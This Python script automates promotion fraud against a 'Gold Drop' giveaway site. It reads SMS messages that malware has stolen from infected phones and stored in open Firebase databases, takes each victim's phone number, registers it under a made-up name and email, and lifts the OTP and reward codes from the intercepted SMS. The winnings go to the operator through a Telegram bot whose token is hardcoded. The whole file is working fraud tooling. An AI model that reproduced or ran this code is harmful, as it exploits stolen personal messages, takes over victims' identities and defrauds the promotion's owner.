# PART 1: Imports, Config & Auto-Uploader
import os
import re
import sys
import time
import json
import base64
import random
import hashlib
import hmac
import requests
import threading
from datetime import datetime
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================= CONFIG =================
FB_FILE = "fb.txt"        
IMAGE_PATH = "sample.jpg" 
BATCH_CODE = "KKD2LS05090926"
PINCODE = "500101"

# TELEGRAM BOT SETTINGS
TELEGRAM_BOT_TOKEN = "8628872988:AAFigomvabLE1Tzb_n3FghnHzat4kUxA5Kc"

OTP_POLL_ATTEMPTS = 5       
OTP_POLL_INTERVAL = 3       
BATCH_SIZE = 20             
PANEL_CHUNK_SIZE = 10       
REWARD_WAIT_TIME = 80      

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
FIRST_NAMES = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Reyansh", "Rohan", "Rahul", "Amit"]
LAST_NAMES = ["Patel", "Shah", "Sharma", "Verma", "Reddy", "Kumar", "Singh", "Yadav", "Gupta"]

class LiveLog:
    def __init__(self):
        self.G, self.R, self.B, self.Y, self.W = '\033[92m', '\033[91m', '\033[94m', '\033[93m', '\033[0m'
        self.M = '\033[95m'
    def _ts(self): return datetime.now().strftime("%H:%M:%S")
    def info(self, msg): print(f"{self.B}[{self._ts()}] [*] {msg}{self.W}", flush=True)
    def ok(self, msg): print(f"{self.G}[{self._ts()}] [+] {msg}{self.W}", flush=True)
    def warn(self, msg): print(f"{self.R}[{self._ts()}] [!] {msg}{self.W}", flush=True)
    def highlight(self, msg): print(f"{self.Y}[{self._ts()}] [>] {msg}{self.W}", flush=True)
    def win(self, msg): print(f"\n\033[92m\033[1m[{self._ts()}] 🎉 WINNER: {msg}\033[0m\n", flush=True)
    def reward(self, msg): print(f"\n{self.M}\033[1m[{self._ts()}] 🎁 REWARD: {msg}{self.W}\n", flush=True)

log = LiveLog()

TELEGRAM_CHAT_ID = None
LAST_UPDATE_ID = 0

def get_latest_chat_id_and_updates():
    global TELEGRAM_CHAT_ID, LAST_UPDATE_ID
    if not TELEGRAM_BOT_TOKEN: return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={LAST_UPDATE_ID + 1}"
    try:
        resp = requests.get(url, timeout=5).json()
        results = resp.get("result", [])
        for update in results:
            LAST_UPDATE_ID = update.get("update_id", LAST_UPDATE_ID)
            msg = update.get("message", {}) or update.get("edited_message", {})
            chat = msg.get("chat", {})
            if chat.get("id"):
                TELEGRAM_CHAT_ID = chat.get("id")
            
            # Check if user sent a document (like fb.txt) or text (panel link)
            document = msg.get("document")
            text = msg.get("text", "").strip()
            
            if document:
                file_name = document.get("file_name", "")
                file_id = document.get("file_id")
                if "fb" in file_name.lower() or file_name.endswith(".txt"):
                    handle_telegram_file_upload(file_id)
            elif text and text.startswith("https://"):
                handle_text_panel_add(text)
    except Exception as e:
        pass

def handle_telegram_file_upload(file_id):
    try:
        f_info = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}", timeout=10).json()
        file_path = f_info.get("result", {}).get("file_path")
        if file_path:
            download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
            file_content = requests.get(download_url, timeout=15).text
            with open(FB_FILE, "a", encoding="utf-8") as f:
                f.write("\n" + file_content)
            send_telegram_message("📥 *New panels file received and appended to `fb.txt` successfully!* ✅")
    except Exception as e:
        send_telegram_message(f"⚠️ Failed to process uploaded file: {e}")

def handle_text_panel_add(link):
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        with open(FB_FILE, "a", encoding="utf-8") as f:
            f.write("\n" + link)
        send_telegram_message(f"➕ *New Firebase Panel added successfully!*\n`{link}`")

def send_telegram_message(text):
    if not TELEGRAM_BOT_TOKEN: return
    get_latest_chat_id_and_updates()
    if not TELEGRAM_CHAT_ID: return
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        log.warn(f"Telegram Send Failed: {e}")
# PART 2: Signing Logic & API Client
def sign_golddrop_data(payload: dict, user_key: str, data_key: str, timestamp_ms: int | None = None) -> tuple[str, str]:
    if timestamp_ms is None: timestamp_ms = int(time.time() * 1000)
    t_str = str(timestamp_ms)
    data_copy = dict(payload)
    data_copy["userKey"] = str(user_key)
    data_copy["t"] = t_str
    p1 = base64.b64encode(t_str.encode("utf-8")).decode("utf-8")
    json_str = json.dumps(data_copy, separators=(",", ":"))
    p2 = base64.b64encode(json_str.encode("utf-8")).decode("utf-8")
    hmac_key = data_key[4:18].encode("utf-8")
    hmac_input = f"{p1}.{p2}".encode("utf-8")
    hmac_hex = hmac.new(hmac_key, hmac_input, hashlib.sha256).hexdigest()
    f = base64.b64encode(hmac_hex.encode("utf-8")).decode("utf-8")
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    p = random.randint(1, 6)
    m = random.randint(2, 8)
    h = "".join(random.choice(alphabet) for _ in range(m))
    s_part = f"{m}{p}{f[:p]}{h}{f[p:]}"
    return f"{p1}.{p2}.{s_part}", t_str

class GoldDropClient:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "accept": "*/*", "accept-language": "en-US,en;q=0.9",
            "origin": "https://golddropgolddhamaka.com",
            "referer": "https://golddropgolddhamaka.com/register",
            "user-agent": USER_AGENT,
        })
        self.user_key = None
        self.data_key = None

    def _decode(self, resp):
        try:
            res_json = resp.json()
            if "resp" in res_json:
                return json.loads(base64.b64decode(res_json["resp"]).decode("utf-8"))
            return res_json
        except: return {"statusCode": 500, "message": resp.text[:50]}

    def init_session(self):
        resp = self.session.post("https://golddropgolddhamaka.com/api/users", json={}, timeout=20)
        decoded = self._decode(resp)
        self.user_key = str(decoded.get("userKey"))
        self.data_key = str(decoded.get("dataKey"))
        if not self.user_key or self.user_key == "None":
            raise Exception("Init Session Failed")

    def register(self, mobile):
        name = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
        clean_name = name.replace(' ', '').lower()
        unique_id = random.randint(1000, 99999)
        domain = random.choice(["gmail.com", "yahoo.com", "outlook.com"])
        email = f"{clean_name}{unique_id}@{domain}"
        
        payload = {"name": name, "mobile": mobile, "email": email, "pincode": PINCODE, "code": BATCH_CODE, "terms_accepted": "1"}
        token, t = sign_golddrop_data(payload, self.user_key, self.data_key)
        
        with open(IMAGE_PATH, "rb") as f:
            img_bytes = f.read()
            
        files = {"img": ("sample.jpg", img_bytes, "image/jpeg")}
        url = f"https://golddropgolddhamaka.com/api/users/register/{self.user_key}?t={t}"
        resp = self.session.post(url, data={"data": token}, files=files, cookies={"gold-drop-id": self.user_key}, timeout=25)
        return self._decode(resp)

    def verify_otp(self, otp):
        if not otp.isdigit() or len(otp) != 6:
            return {"statusCode": 400, "message": "OTP must be 6 digits"}
        payload = {"otp": str(otp)}
        token, t = sign_golddrop_data(payload, self.user_key, self.data_key)
        headers = {"content-type": "application/json", "referer": "https://golddropgolddhamaka.com/otp"}
        url = f"https://golddropgolddhamaka.com/api/users/verify-otp/{self.user_key}?t={t}"
        resp = self.session.post(url, headers=headers, json={"data": token}, cookies={"gold-drop-id": self.user_key}, timeout=15)
        return self._decode(resp)
# PART 3: Firebase Parsing & Polling Helpers
def parse_firebase_link(link):
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link if link.endswith("/") else link + "/"
    return None

def extract_phone_from_messages(device_messages):
    if not isinstance(device_messages, dict): return None
    patterns = [
        (re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'), 10),
        (re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE), 15),
        (re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'), 5),
    ]
    counts = Counter()
    for msg in device_messages.values():
        if not isinstance(msg, dict): continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
        for pattern, score in patterns:
            for number in pattern.findall(text):
                counts[number] += score
    if not counts: return None
    return counts.most_common(1)[0][0]

def extract_otp_from_messages(device_messages, trigger_time_ms):
    if not isinstance(device_messages, dict): return None
    for msg_id in reversed(list(device_messages.keys())):
        msg_data = device_messages[msg_id]
        if not isinstance(msg_data, dict): continue
        try:
            if int(msg_id) < (trigger_time_ms - 30000): continue
        except ValueError: pass
        sender = str(msg_data.get("sender", "")).upper()
        body = str(msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or "")
        if "BGCITY" in sender:
            match = re.search(r'(?<!\d)(\d{6})(?!\d)', body)
            if match: return match.group(0)
    return None

def fetch_devices_and_phones(firebase_url):
    try:
        c_req = requests.get(firebase_url + "clients.json", timeout=20)
        clients_data = c_req.json() or {}
        m_req = requests.get(firebase_url + "messages.json", timeout=20)
        messages_data = m_req.json() or {}
    except Exception:
        return []
    if not isinstance(clients_data, dict) or not isinstance(messages_data, dict):
        return []
    online_devices = [c_id for c_id, c_data in clients_data.items() if isinstance(c_data, dict) and c_data.get("status") is True]
    result, seen = [], set()
    for c_id in online_devices:
        phone = extract_phone_from_messages(messages_data.get(c_id, {}))
        if phone and phone not in seen:
            seen.add(phone)
            result.append({"client_id": c_id, "phone": phone, "firebase_url": firebase_url})
    return result

def poll_for_otp(firebase_url, client_id, trigger_time_ms):
    for attempt in range(OTP_POLL_ATTEMPTS):
        time.sleep(OTP_POLL_INTERVAL)
        try:
            m_req = requests.get(f"{firebase_url}messages/{client_id}.json", timeout=10)
            messages = m_req.json()
            if not isinstance(messages, dict): continue
            otp = extract_otp_from_messages(messages, trigger_time_ms)
            if otp: return otp
        except Exception: pass
    return None
# PART 4: Reward Watcher & Number Processing Engine
def extract_reward_code(messages, trigger_time_ms):
    if not isinstance(messages, dict): return None, None
    for msg_id in reversed(list(messages.keys())):
        msg_data = messages[msg_id]
        if not isinstance(msg_data, dict): continue
        try:
            if int(msg_id) < (trigger_time_ms - 60000): continue
        except ValueError: pass
        body = str(msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or "")
        sender = str(msg_data.get("sender") or "").upper()
        if "BGCITY" in sender or "GOLD" in sender or "GD" in sender:
            match = re.search(r'Reward Code is\s+([A-Z0-9]{6,20})', body, re.IGNORECASE)
            if match: return match.group(1).upper(), body
            match = re.search(r'code\s*(?:is|:|-)\s*([A-Z0-9]{6,20})', body, re.IGNORECASE)
            if match: return match.group(1).upper(), body
    return None, None

def watch_for_reward(firebase_url, client_id, phone, api_response):
    trigger_time_ms = int(time.time() * 1000)
    log.info(f"🔍 [{phone}] Waiting for Reward SMS...")
    start_time = time.time()
    while time.time() - start_time < REWARD_WAIT_TIME:
        time.sleep(10)
        try:
            resp = requests.get(f"{firebase_url}messages/{client_id}.json", timeout=10)
            messages = resp.json()
            if not isinstance(messages, dict): continue
            code, full_body = extract_reward_code(messages, trigger_time_ms)
            if code:
                log.reward(f"{phone} | Code: {code}")
                send_telegram_message(f"🎁 *REWARD CODE WON!*\n📱 Phone: `{phone}`\n🔑 Code: `{code}`")
                with open("golddrop_winners.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{datetime.now()}] Phone: {phone} | Code: {code} | SMS: {full_body}\n")
                return
        except Exception: pass
    log.warn(f"⏰ [{phone}] Reward SMS timeout.")

def process_number(device, stats):
    phone = device["phone"]
    client_id = device["client_id"]
    firebase_url = device["firebase_url"]
    
    client = GoldDropClient()
    try:
        client.init_session()
        reg_res = client.register(phone)
        msg = str(reg_res.get("message", "")).lower()
        
        stats["total_tried"] += 1
        if "already" in msg or "exist" in msg or "used" in msg:
            stats["blocked"] += 1
            log.warn(f"[{phone}] Register blocked (Limit reached)")
            return {"status": "already_used"}
            
        if reg_res.get("statusCode") != 200 and "OTP" not in msg.upper():
            stats["failed"] += 1
            log.warn(f"[{phone}] Register failed: {reg_res.get('message')}")
            return {"status": "failed"}
            
        stats["otp_sent"] += 1
        log.ok(f"OTP sent to {phone}")
        
        trigger_time_ms = int(time.time() * 1000)
        log.highlight(f"Waiting for OTP for {phone}...")
        otp = poll_for_otp(firebase_url, client_id, trigger_time_ms)
        
        if not otp:
            stats["timeout"] += 1
            log.warn(f"[{phone}] OTP timeout!")
            return {"status": "timeout"}
            
        stats["otp_received"] += 1
        log.ok(f"OTP received: {otp}")
        
        verify_res = client.verify_otp(otp)
        
        if verify_res.get("statusCode") != 200:
            log.warn(f"[{phone}] Verify failed: {verify_res.get('message')}")
            return {"status": "verify_failed"}
            
        win_type = str(verify_res.get("win_type", "none")).lower()
        if win_type and win_type != "none":
            stats["wins"] += 1
            reward = verify_res.get("reward")
            reward_str = f"{reward.get('name', 'Prize')} (₹{reward.get('face_value', '?')})" if isinstance(reward, dict) else str(reward)
            log.win(f"{phone} | Reward: {reward_str}")
            threading.Thread(target=watch_for_reward, args=(firebase_url, client_id, phone, verify_res), daemon=True).start()
            return {"status": "success"}
        else:
            stats["no_wins"] += 1
            log.ok(f"Better Luck | {phone}")
            return {"status": "no_win"}
    except Exception as e:
        stats["errors"] += 1
        log.warn(f"API Error {phone} | {str(e)[:50]}")
        return {"status": "error"}
# PART 5: 20-Min Usage Monitor & Main Execution
def background_usage_monitor(stats):
    """Har 20 minute mein automatic usage report Telegram par bhejega"""
    while True:
        time.sleep(1200) # 20 minutes
        report = (
            f"📊 *LIVE USAGE REPORT (Every 20 Min)*\n\n"
            f"• Total Tried: `{stats['total_tried']}`\n"
            f"• Blocked/Limit Reached: `{stats['blocked']}`\n"
            f"• OTP Sent: `{stats['otp_sent']}`\n"
            f"• Successful Wins: `{stats['wins']}`\n"
            f"• Better Luck (No Win): `{stats['no_wins']}`\n"
            f"• Errors/Timeouts: `{stats['timeout'] + stats['errors']}`"
        )
        send_telegram_message(report)

def main():
    start_time_global = time.time()
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=" * 70)
    print("  GOLD DROP x FIREBASE FULLY AUTO ENGINE (v3.4 - 20min Report & Upload)")
    print("=" * 70)

    if not os.path.exists(FB_FILE):
        open(FB_FILE, "w").close()
    if not os.path.exists(IMAGE_PATH):
        log.warn("FATAL: 'sample.jpg' not found in folder.")
        return

    send_telegram_message("🚀 *Script Started (v3.4)*\nSend any new panel link or `fb.txt` file anytime to add panels automatically!")

    stats = {"total_tried": 0, "blocked": 0, "failed": 0, "otp_sent": 0, "otp_received": 0, "timeout": 0, "wins": 0, "no_wins": 0, "errors": 0}

    # Start 20-minute background usage reporter thread
    threading.Thread(target=background_usage_monitor, args=(stats,), daemon=True).start()

    while True:
        # Check incoming telegram updates (for file/panel uploads)
        get_latest_chat_id_and_updates()

        if not os.path.exists(FB_FILE):
            time.sleep(10)
            continue

        urls = []
        with open(FB_FILE, "r", encoding="utf-8") as f:
            for line in f:
                url = parse_firebase_link(line.strip())
                if url and url not in urls: urls.append(url)
        
        if not urls:
            log.warn("No panels found in fb.txt. Waiting for panels...")
            time.sleep(15)
            continue

        log.ok(f"Total panels loaded: {len(urls)}")

        for chunk_start in range(0, len(urls), PANEL_CHUNK_SIZE):
            get_latest_chat_id_and_updates()
            panel_chunk = urls[chunk_start: chunk_start + PANEL_CHUNK_SIZE]
            log.info(f"📦 Processing Panel Chunk [{chunk_start + 1} to {min(chunk_start + PANEL_CHUNK_SIZE, len(urls))} of {len(urls)}]...")

            all_devices = []
            with ThreadPoolExecutor(max_workers=len(panel_chunk)) as ex:
                futures = {ex.submit(fetch_devices_and_phones, url): url for url in panel_chunk}
                for future in as_completed(futures):
                    try:
                        res = future.result()
                        if res: all_devices.extend(res)
                    except Exception: pass

            unique_devices, seen_phones = [], set()
            for d in all_devices:
                if d["phone"] not in seen_phones:
                    seen_phones.add(d["phone"])
                    unique_devices.append(d)

            total_chunk_numbers = len(unique_devices)
            log.ok(f"Found {total_chunk_numbers} unique online numbers in this chunk.")

            for batch_start in range(0, total_chunk_numbers, BATCH_SIZE):
                get_latest_chat_id_and_updates()
                batch = unique_devices[batch_start: batch_start + BATCH_SIZE]
                batch_end = min(batch_start + BATCH_SIZE, total_chunk_numbers)
                log.info(f"━━━ Numbers Batch [{batch_start + 1}–{batch_end} of {total_chunk_numbers}] ━━━")
                
                with ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor:
                    futures = {executor.submit(process_number, d, stats): d["phone"] for d in batch}
                    for future in as_completed(futures): pass
                
                time.sleep(1)

        log.info("Finished one full round of all panels. Waiting 60 seconds before next loop...")
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        send_telegram_message("⚠️ Script stopped manually by user.")
        print("\n[!] Stopped by user.")
